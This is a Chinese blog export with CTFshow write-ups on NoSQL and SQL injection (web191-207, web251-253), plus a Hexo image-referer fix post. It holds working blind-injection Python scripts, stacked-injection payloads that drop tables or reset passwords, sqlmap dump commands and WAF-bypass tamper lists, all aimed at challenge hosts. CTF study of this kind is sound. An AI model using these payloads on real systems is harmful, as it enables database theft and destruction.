title="web251"></a>web251</h1><p>post传入：</p><pre class="language-sql" data-language="sql"><code class="language-sql">username[$regex]&#x3D;.*&amp;password[$regex]&#x3D;.*</code></pre><h1 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h1><pre class="language-sql" data-language="sql"><code class="language-sql">username[$regex]&#x3D;f.*&amp;password[$ne]&#x3D;1</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690559031690-d2869572-b4e7-4998-82b0-ac7e4a1077cc.png" alt="image.png"></p><h1 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h1><p>这里直接用别人的脚本了：<br>道理是相同的，一点点猜即可。</p><pre class="language-sql" data-language="sql"><code class="language-sql"># -- coding:UTF-8 --# Author:孤桜懶契# Date:2021&#x2F;8&#x2F;4# blog: gylq.gitee.ioimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;a2efa0f0-f634-4621-bd4a-e96a4f1b0196.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;str &#x3D; &quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;flag &#x3D; &quot;&quot;payload_user &#x3D; &quot;flag.*&quot;payload_pass &#x3D; &quot;^&#123;&#125;.*&quot;n &#x3D; 0for i in range(1, 666):    for j in str:        data &#x3D; &#123;            &#39;username[$regex]&#39;:payload_user,            &#39;password[$regex]&#39;:payload_pass.format(flag+j)        &#125;        res &#x3D; requests.post(url &#x3D; url, data&#x3D;data)        if r&quot;\u767b\u9646\u6210\u529f&quot; in res.text:            flag +&#x3D; j            n +&#x3D; 1            print(&#39;[*] 开始盲注第&#123;&#125;位&#39;.format(n))            print(flag)            if j &#x3D;&#x3D; &quot;&#125;&quot;:                print(&#39;[*] flag is &#123;&#125;&#39;.format(flag))                exit()            break</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690559359451-1e99e676-d5bf-441a-9aa3-ead32343ea3f.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Python脚本修改语雀导文件图片格式(二)</title>
      <link href="/posts/d18ef46e/"/>
      <url>/posts/d18ef46e/</url>
      
        <content type="html"><![CDATA[<p>如果你用了我之前发的脚本，你就会发现这个图片删后缀解析功能失效了。<br>不仅如此，以前用过生成的所有图片也失效了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341771143-c9ff93d6-105e-4b66-843b-6a71055630dc.png" alt="image.png"><br>如果预览的话，会提示如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341553395-02439fe9-4d5d-4472-addd-b145a50c68a5.png" alt="image.png"><br>但是当多次访问之后就会提示下载，但是图片仍然不会解析。<br>本来以为用不了了，打算搞个接口自己刷新，但是教程太乱了，而且感觉应该还有绕过的办法。<br>经过多次调试发现，这里有一个referer验证。<br>没有referer的访问是会被403的。<br>因此这个问题就变成了如何让访问具有referer验证，或者说不让他验证。<br>在网上查了很久发现一段代码：</p><pre class="language-python" data-language="python"><code class="language-python">&lt;meta name&#x3D;&quot;referrer&quot; content&#x3D;&quot;no-referrer&quot; &#x2F;&gt;</code></pre><p>用它来拒绝referer的请求。原文提示说，需要放在主题文件下的post.ejs文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341855216-ca39347e-3323-48e1-8f30-3c30a27f6efd.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341886707-ad13d3bd-e38d-4ca6-8f99-950d29a7933b.png" alt="image.png"><br>如果到这里，你的博客正好有<code>.ejs</code>文件。那就少了很多折腾。<br>以我的为例（butterfly）这个主题文件下的内容全是以<code>.pug</code>格式为后缀，<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341987132-603e1d10-1028-495d-b11c-7f6ff6dc77fd.png" alt="image.png"><br>因此，原封不动照抄是会一片红的。<img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689342102855-d9c2abd5-2686-4a18-b042-81261ab1a39a.png" alt="image.png"><br>研究了挺长时间，找了找语法，得到了一种修改办法。</p><pre class="language-python" data-language="python"><code class="language-python">meta(name&#x3D;&quot;referrer&quot;, content&#x3D;&quot;no-referrer&quot;)</code></pre><p>将其修改成对应语法，并且塞到某一个位置。注意，这行代码在不同位置，可能会导致你的博客排版错误。<br>我放在了<code>themes\butterfly\layout</code>下的post.pug，并置于：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689342167433-b44c1209-5565-4bdd-9140-991addb4bdeb.png" alt="image.png"><br>再说一遍，这行代码在不同位置，可能会导致你的博客排版错误。这里是我试过不会排版错误，而且能重新拉取到图片的地方。<br>保存之后，运行以下命令：</p><pre class="language-python" data-language="python"><code class="language-python">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</code></pre><p>查看本地；拉取效果。<br>如果重新出现图片，就说明拉取成功了，deploy到远端即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689342465833-28799703-6b56-49d7-af39-bd43bd76e6ce.png" alt="image.png"></p><h2 id="已经有了更好的办法"><a href="#已经有了更好的办法" class="headerlink" title="已经有了更好的办法"></a>已经有了更好的办法</h2><p>之前按这样改，会出现进入页面还是损坏图片，但是点击获取一下，再刷新页面就会正常获取图片。<br>思考了一下，这不就说明引用条件太晚了，图片已经被请求过了。<br>那我就有个想法，直接改到引用比较靠前的文件中去，比如说：<br><code>\themes\butterfly\layout\includes</code>文件夹下的<code>layout.pug</code>在这个文件中写。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689343646123-2d3213ae-5535-4e76-b193-2df07d9aa8b4.png" alt="image.png"><br>保存刷新一下，发现已经可用了。进入加载页面就可以显示图片了。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>如果修改之后还没显示，清除cookie刷新一下试试，如果还不行，那就只能自己再想办法了。改过好几个了，应该还能挺一段时间。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
            <tag> Shortcut </tag>
            
            <tag> 语雀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web191-web213SQL注入篇（二）</title>
      <link href="/posts/84a9ce9a/"/>
      <url>/posts/84a9ce9a/</url>
      
        <content type="html"><![CDATA[<h1 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h1><p>跟上题一样，由于换了一章，就重新叙述一下。<br>布尔盲注需要先找到一个可改变的注入点。<br>比如：</p><ul><li><code>admin&#39; and 0#</code>时返回的是用户名不存在</li><li><code>admin&#39; and 1#</code>返回的是密码错误</li></ul><p>由此编写脚本：这题还是用是190的脚本即可<br>直接使用paayload：</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL布尔盲注2.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;11 22:02   natro92      1.0         None&quot;&quot;&quot;import stringimport requestsimport timeurl &#x3D; r&#39;http:&#x2F;&#x2F;cc8108f9-dbcc-44a5-aba7-90536cd74d69.challenge.ctf.show&#x2F;api&#x2F;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_ -&#125;&quot;# payload &#x3D; &quot;admin&#39;and+if(substr(database(),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;# payload &#x3D; &quot;admin&#39;and+if(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_fl0g&#39;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;payload &#x3D; &quot;admin&#39;and+if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;res &#x3D; &#39;&#39;for i in range(1,100):    for j in str1:        data &#x3D; &#123;            &#39;username&#39;: payload.format(i, j),            &#39;password&#39;: &#39;0&#39;        &#125;        r &#x3D; requests.post(url, data&#x3D;data)        # print(data)        # print(r.json()[&#39;msg&#39;])        if &#39;密码错误&#39; in r.json()[&#39;msg&#39;]:            res +&#x3D; j            print(res)            break            time.sleep(0.3)        if j &#x3D;&#x3D; &#39;&#125;&#39;:            exit()</code></pre><h1 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h1><pre class="language-python" data-language="python"><code class="language-python">&#x2F;&#x2F;TODO:感觉少了个啥，奇怪    if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex&#x2F;i&#39;, $username))&#123;        $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;        die(json_encode($ret));    &#125;</code></pre><p>可惜对我没用，我这里没用ascii做，前面几个可以结合ascii和二分法结合查找，wp写的很巧妙。<br>比如：<code>if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)</code><br>还是使用上题的脚本。</p><h1 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h1><h3 id="substr过滤可以使用mid、left、right来代替"><a href="#substr过滤可以使用mid、left、right来代替" class="headerlink" title="substr过滤可以使用mid、left、right来代替"></a>substr过滤可以使用mid、left、right来代替</h3><p>把substr过滤了，根据网上所说，可以用这几个来实现相同操作：<br>先来介绍一下几个函数用法，以下由gpt输出。</p><ol><li>MID函数：<ul><li>MID(string, start, length)：从指定的字符串中提取一个子字符串。它接受三个参数：<ul><li>string：要提取子字符串的源字符串。</li><li>start：指定要开始提取的位置的索引。索引从1开始。</li><li>length：指定要提取的子字符串的长度。</li></ul></li></ul><ol><li>例如，假设有一个字符串’Hello, World!’，你可以使用MID函数提取其中的子字符串，如下所示：</li></ol><ul><li>MID(‘Hello, World!’, 1, 5)：提取从索引位置1开始的5个字符，结果为’Hello’。</li></ul></li><li>LEFT函数：<ul><li>LEFT(string, length)：从指定的字符串的开头提取一个子字符串。它接受两个参数：<ul><li>string：要提取子字符串的源字符串。</li><li>length：指定要提取的子字符串的长度。</li></ul></li></ul><ol><li>例如，假设有一个字符串’Hello, World!’，你可以使用LEFT函数提取其中的子字符串，如下所示：</li></ol><ul><li>LEFT(‘Hello, World!’, 5)：提取开头的5个字符，结果为’Hello’。</li></ul></li><li>RIGHT函数：<ul><li>RIGHT(string, length)：从指定的字符串的末尾提取一个子字符串。它接受两个参数：<ul><li>string：要提取子字符串的源字符串。</li><li>length：指定要提取的子字符串的长度。</li></ul></li></ul><ol><li>例如，假设有一个字符串’Hello, World!’，你可以使用RIGHT函数提取其中的子字符串，如下所示：</li></ol><ul><li>RIGHT(‘Hello, World!’, 6)：提取末尾的6个字符，结果为’World!’。</li></ul></li></ol><p>这里用mid即可，稍作修改脚本：</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL布尔盲注2.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;11 22:02   natro92      1.0         None&quot;&quot;&quot;import stringimport requestsimport timeurl &#x3D; r&#39;http:&#x2F;&#x2F;b40c977f-1bc2-4d31-97ee-da13510260aa.challenge.ctf.show&#x2F;api&#x2F;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_ -&#125;&quot;# payload &#x3D; &quot;admin&#39;and+if(mid(database(),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;# payload &#x3D; &quot;admin&#39;and+if(mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;# payload &#x3D; &quot;admin&#39;and+if(mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flxg&#39;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;payload &#x3D; &quot;admin&#39;and+if(mid((select group_concat(f1ag) from ctfshow_flxg),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;res &#x3D; &#39;&#39;for i in range(1,100):    for j in str1:        data &#x3D; &#123;            &#39;username&#39;: payload.format(i, j),            &#39;password&#39;: &#39;0&#39;        &#125;        r &#x3D; requests.post(url, data&#x3D;data)        # print(data)        # print(r.json()[&#39;msg&#39;])        if &#39;密码错误&#39; in r.json()[&#39;msg&#39;]:            res +&#x3D; j            print(res)            break            time.sleep(0.3)        if j &#x3D;&#x3D; &#39;&#125;&#39;:            exit()</code></pre><p>但是这里还是简单提一下left和right这里的写法：<br>right<br>从右边开始截取,配合ascii使用.<br>ascii(‘str’)返回字符串的第一个字符的ascii码<br>ascii(right(‘abc’,2))&#x3D; 97相当于 ascii(‘bc’)&#x3D;97<br>left<br>从左边开始截取,用reverse反转<br>ascii(reverse(left(‘abc’,2))) &#x3D; 97 相当于 ascii(‘bc’)&#x3D;97<br>mid和strsub效果一样,代码同上<br>这是一种解法，还可以：</p><pre class="language-python" data-language="python"><code class="language-python">admin&#39;and ((left((select database()),&#123;&#125;)&#x3D;&#39;&#123;&#125;&#39;))#</code></pre><h1 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h1><p>left和right被滤掉了<br>还能用mid。<br>上题相同脚本即可。</p><h1 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h1><h3 id="堆叠注入-a-0匹配所有开头不是数字或者为0的字符串和数字"><a href="#堆叠注入-a-0匹配所有开头不是数字或者为0的字符串和数字" class="headerlink" title="堆叠注入 a&#x3D;0匹配所有开头不是数字或者为0的字符串和数字"></a>堆叠注入 <strong>a&#x3D;0匹配所有开头不是数字或者为0的字符串和数字</strong></h3><blockquote><p><a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p></blockquote><p>什么是堆叠注入，我一听这名字也懵了一下，查了一下，就是末尾加<code>；</code>链接下一个命令语句。使其一起执行。<br>空格被过滤了，可以用反引号执行。<br>题目里提示说登陆成功即可得到flag，那么将数据的密码切换为自己的密码即可。</p><pre class="language-python" data-language="python"><code class="language-python">if($row[0]&#x3D;&#x3D;$password)&#123;      $ret[&#39;msg&#39;]&#x3D;&quot;登陆成功 flag is $flag&quot;;  &#125;</code></pre><p>由于sql的知识就是一坨，还是先查了一下写法：</p><pre class="language-sql" data-language="sql"><code class="language-sql">UPDATE table_nameSET column1 &#x3D; value1, column2 &#x3D; value2, ...WHERE condition;</code></pre><p>因此可以写出payload:</p><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;1;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;1&amp;password&#x3D;1然后上传username&#x3D;0&amp;password&#x3D;1</code></pre><p>就会返回flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689160962992-9e51c7f1-4f6c-428c-ba4f-5a04d65443df.png" alt="image.png"><br><strong>（username&#x3D;0这个做法在web188中有提到，就是匹配所有开头不是数字或者为0的字符串和数字0）</strong><br>或者，还可以：</p><pre class="language-sql" data-language="sql"><code class="language-sql">0x61646d696e;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;123456然后账号0x61646d696e和密码123456</code></pre><h1 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h1><p>限制了用户名长度。看了wp才发现，这里的select没被过滤。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689163102786-54c21ea0-9ae6-4f5c-bb7d-81ba8af98594.png" alt="image.png"><br>啊这<br>payload：<code>username=1;select(1)&amp;password=1</code>让select的值覆盖给需要比对的参数，然后再传入你需要的密码。</p><h1 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h1><h3 id="show-tables查看表名-drop-create删表和创建表-insert插入数据"><a href="#show-tables查看表名-drop-create删表和创建表-insert插入数据" class="headerlink" title="show tables查看表名 drop\create删表和创建表 insert插入数据"></a>show tables查看表名 drop\create删表和创建表 insert插入数据</h3><h2 id="方法一-show-tables"><a href="#方法一-show-tables" class="headerlink" title="方法一 show tables"></a>方法一 show tables</h2><p>show tables获取表名的结果集。<br>由题目可知，ctfshow_user在其中，我们只需要这样传值即可</p><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;1;show tables&amp;password&#x3D;ctfshow_user</code></pre><h2 id="方法二-删表-把他变成自己的样子"><a href="#方法二-删表-把他变成自己的样子" class="headerlink" title="方法二 删表 把他变成自己的样子"></a>方法二 删表 把他变成自己的样子</h2><pre class="language-sql" data-language="sql"><code class="language-sql">0;drop table ctfshow_user;create table ctfshow_user(&#96;username&#96; varchar(100),&#96;pass&#96; varchar(100));insert ctfshow_user(&#96;username&#96;,&#96;pass&#96;) value(1,1)</code></pre><p>然后直接账号密码输入1和1即可<br>当然也可以直接insert插入：</p><pre class="language-sql" data-language="sql"><code class="language-sql">username:0;insert  ctfshow_user(&#96;username&#96;,&#96;pass&#96;) value(0,0);password:0</code></pre><h2 id="SQL知识补充-drop、create、insert"><a href="#SQL知识补充-drop、create、insert" class="headerlink" title="SQL知识补充-drop、create、insert"></a>SQL知识补充-drop、create、insert</h2><pre class="language-sql" data-language="sql"><code class="language-sql">DROP OBJECT_TYPE [IF EXISTS] object_name;- &#96;OBJECT_TYPE&#96;：指定要删除的对象类型，如&#96;TABLE&#96;（表）、&#96;VIEW&#96;（视图）等。- &#96;IF EXISTS&#96;（可选）：如果加上此选项，如果要删除的对象不存在，则不会引发错误。- &#96;object_name&#96;：指定要删除的对象的名称。</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">CREATE OBJECT_TYPE object_name(    column1 data_type,    column2 data_type,    ...);- &#96;OBJECT_TYPE&#96;：指定要创建的对象类型，如&#96;TABLE&#96;（表）、&#96;VIEW&#96;（视图）等。- &#96;object_name&#96;：指定要创建的对象的名称。- &#96;column1 data_type, column2 data_type, ...&#96;：指定对象的列及其数据类型。</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">INSERT INTO table_name (column1, column2, ...)VALUES (value1, value2, ...);- &#96;table_name&#96;：指定要插入数据的表的名称。- &#96;column1, column2, ...&#96;：指定要插入数据的列。- &#96;value1, value2, ...&#96;：指定要插入的值，与列一一对应。</code></pre><h1 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h1><p>继续用上题的insert插入即可。</p><pre class="language-sql" data-language="sql"><code class="language-sql">username:0;insert  ctfshow_user(&#96;username&#96;,&#96;pass&#96;) value(0,0);password:0</code></pre><h1 id="web199、web200"><a href="#web199、web200" class="headerlink" title="web199、web200"></a>web199、web200</h1><p>括号被禁用了，那就用那个show tables</p><pre class="language-sql" data-language="sql"><code class="language-sql">0;show tablesctfshow_user</code></pre><h1 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h1><h3 id="sqlmapGET注入-referer"><a href="#sqlmapGET注入-referer" class="headerlink" title="sqlmapGET注入 referer"></a>sqlmapGET注入 referer</h3><pre class="language-sql" data-language="sql"><code class="language-sql">当前数据库参数：--current-db返还当前连接的数据库。列举数据库表参数：--tables,--exclude-sysdbs,-D当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。--exclude-sysdbs参数是指包含了所有的系统数据库。需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。列举数据库表中的字段参数：--columns,-C,-T,-D当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。如果没有使用-D参数指定数据库时，默认会使用当前数据库。获取整个表的数据参数：--dump,-C,-T,-D,--start,--stop,--first,--last如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库。</code></pre><p>payload：<code>sqlmap -u http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/api/\?id\=1 --refer=http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/sqlmap.php</code><br>返回出：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166554462-4a3c7438-52d5-4b6d-b87d-910192d93e48.png" alt="image.png"><br>然后用payload爆表爆词条<br>爆库：</p><pre class="language-sql" data-language="sql"><code class="language-sql">sqlmap -u http:&#x2F;&#x2F;6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show&#x2F;api&#x2F;\?id\&#x3D;1 --refer&#x3D;http:&#x2F;&#x2F;6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show&#x2F;sqlmap.php</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166695514-becf0b5a-ebd9-4e7f-a93f-08e61f61a372.png" alt="image.png"><br>爆表：</p><pre class="language-sql" data-language="sql"><code class="language-sql">sqlmap -u http:&#x2F;&#x2F;6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show&#x2F;api&#x2F;\?id\&#x3D;1 --refer&#x3D;http:&#x2F;&#x2F;6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show&#x2F;sqlmap.php -D ctfshow_web --tables</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166764719-0fee533f-e0a8-4971-bd2d-a8ea49d132f4.png" alt="image.png"><br>爆词条</p><pre class="language-sql" data-language="sql"><code class="language-sql">sqlmap -u http:&#x2F;&#x2F;6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show&#x2F;api&#x2F;\?id\&#x3D;1 --refer&#x3D;http:&#x2F;&#x2F;6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show&#x2F;sqlmap.php -D ctfshow_web -T ctfshow_user --columns</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166806079-e9066b90-185d-4eee-a837-3c79ea26c08c.png" alt="image.png"><br>查看字段</p><pre class="language-sql" data-language="sql"><code class="language-sql">sqlmap -u http:&#x2F;&#x2F;6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show&#x2F;api&#x2F;\?id\&#x3D;1 --refer&#x3D;http:&#x2F;&#x2F;6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show&#x2F;sqlmap.php -D ctfshow_web -T ctfshow_user -C id,pass,username --dump</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166915916-68f13c0c-13e8-47fd-90f4-fe5f87d32ff1.png" alt="image.png"></p><h1 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h1><h3 id="sqlmapPOST注入-注意–referer和–data"><a href="#sqlmapPOST注入-注意–referer和–data" class="headerlink" title="sqlmapPOST注入 注意–referer和–data"></a>sqlmapPOST注入 注意–referer和–data</h3><p>抓包用的虽然是get，但是提示说是用post传参。<br>那就用post试一下。<br>我不理解这个referer的ctf.show是怎么确定的。</p><pre class="language-sql" data-language="sql"><code class="language-sql">sqlmap -u http:&#x2F;&#x2F;c3420367-21b9-4692-8570-1ac73fb7a651.challenge.ctf.show&#x2F;api&#x2F; --data&#x3D;&#39;id&#x3D;1&#39; --refer&#x3D;&#39;ctf.show&#39; --dbs</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u http:&#x2F;&#x2F;c3420367-21b9-4692-8570-1ac73fb7a651.challenge.ctf.show&#x2F;api&#x2F; --data&#x3D;&#39;id&#x3D;1&#39; --referer&#x3D;&#39;ctf.show&#39; -D ctfshow_web -T ctfshow_user -C id,pass,username --dump</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689168116809-aecb017b-30da-4d98-8cf2-62ae2e821ebf.png" alt="image.png"></p><h1 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h1><h3 id="–method-切换方式-PUT请求"><a href="#–method-切换方式-PUT请求" class="headerlink" title="–method 切换方式 PUT请求"></a>–method 切换方式 PUT请求</h3><p>提示–method切换方式，使用PUT方法，需要加上Content-Type头，否则会变成表单提交：<br>我真的不太理解，这里为什么相同参数 我的就不行，wp的就可以：</p><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u http:&#x2F;&#x2F;3c00342b-19a7-4a23-aa48-e84c36c5bcef.challenge.ctf.show&#x2F;api&#x2F;index.php --refer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_user -C id,pass,username --dump</code></pre><h2 id="PUT请求"><a href="#PUT请求" class="headerlink" title="PUT请求"></a>PUT请求</h2><p>PUT请求的工作原理如下：</p><ol><li>客户端发送PUT请求到服务器，并指定要更新的资源的URI（统一资源标识符）。</li><li>服务器收到PUT请求后，会检查请求头中的Content-Type字段来确定接收的数据格式。</li><li>服务器根据请求中提供的数据更新对应的资源。如果资源不存在，服务器可能会根据请求中的数据创建新的资源。</li><li>服务器返回HTTP响应码，指示PUT请求的处理结果。</li></ol><h1 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h1><h3 id="–cookie"><a href="#–cookie" class="headerlink" title="–cookie"></a>–cookie</h3><p>先抓包获取cookie参数：<br><code>PHPSESSID=5mb3tupsgnxxxxxx; ctfshow=07cxxxxxxxxx</code><br>然后构建payload</p><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u http:&#x2F;&#x2F;087527a8-18dc-4e85-984e-4f9a39590671.challenge.ctf.show&#x2F;api&#x2F;index.php --refer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;5mb3xxxxq7ajmjalma2rc; ctfshow&#x3D;07cdfa7549bc3cxxx9edxxxxxxea&quot; -D ctfshow_web -T ctfshow_user -C id,pass,username --dump</code></pre><h1 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h1><h3 id="api鉴权-–safe-url-–safe-freq"><a href="#api鉴权-–safe-url-–safe-freq" class="headerlink" title="api鉴权 –safe-url –safe-freq"></a>api鉴权 –safe-url –safe-freq</h3><p>每次查询请求可以注意到都会访问目标网页：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689169274466-380ecb13-009d-4bdd-a657-ee7081adc43b.png" alt="image.png"><br>需要以下两个参数：</p><pre class="language-bash" data-language="bash"><code class="language-bash">--safe-url 设置在测试目标地址前访问的安全链接--safe-freq 设置两次注入测试前访问安全链接的次数</code></pre><p>payload：</p><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u http:&#x2F;&#x2F;0a640dc6-69ff-4520-8def-d404e2db36dd.challenge.ctf.show:8080&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;0a640dc6-69ff-4520-8def-d404e2db36dd.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flax -C flagx,id,tes --dump --batch</code></pre><h1 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h1><h3 id="–level-5"><a href="#–level-5" class="headerlink" title="–level&#x3D;5"></a>–level&#x3D;5</h3><p>提示说sql需要闭合，<br>打不出来可以使用更高的LEVEL调用更多的payload。<br>其实都不用提高等级，sqlmap低level就可以：</p><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u http:&#x2F;&#x2F;9437af85-a95a-488f-9e17-c3f716c65456.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;9437af85-a95a-488f-9e17-c3f716c65456.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flaxc -C flagv --dump --batch</code></pre><h1 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h1><h3 id="tamper的编写-常见tamper脚本"><a href="#tamper的编写-常见tamper脚本" class="headerlink" title="tamper的编写 常见tamper脚本"></a>tamper的编写 常见tamper脚本</h3><p>首先看过滤：</p><pre class="language-bash" data-language="bash"><code class="language-bash">&#x2F;&#x2F;对传入的参数进行了过滤  function waf($str)&#123;   return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);  &#125;</code></pre><p>常用tamper脚本：</p><pre class="language-bash" data-language="bash"><code class="language-bash">举例如下tamper脚本：apostrophemask.py 用utf8代替引号equaltolike.py MSSQL * SQLite中like 代替等号greatest.py MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号space2hash.py 空格替换为#号 随机字符串 以及换行符 space2comment.py 用&#x2F;**&#x2F;代替空格apostrophenullencode.py MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号halfversionedmorekeywords.py 